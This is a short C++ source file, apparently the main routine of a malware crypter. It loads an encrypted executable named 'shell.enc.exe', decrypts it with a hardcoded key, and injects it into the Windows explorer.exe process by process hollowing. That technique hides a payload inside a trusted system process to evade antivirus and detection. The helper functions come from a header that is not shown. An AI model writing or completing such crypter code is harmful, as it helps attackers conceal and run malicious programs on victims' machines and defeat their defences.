/**
 * main.cpp
 **/

#include "crypter.hpp"

int main(int argc, char **argv)
{
    /* read pe data into memory */
    pe_data_t pe_data;
    pe_data_read(&pe_data, "shell.enc.exe");
    pe_data_decrypt(&pe_data, "yellow submarine");

    /* inject pe via process hollowing */
    pe_data_inject(&pe_data, "C:\\Windows\\explorer.exe");
    return 0;
}
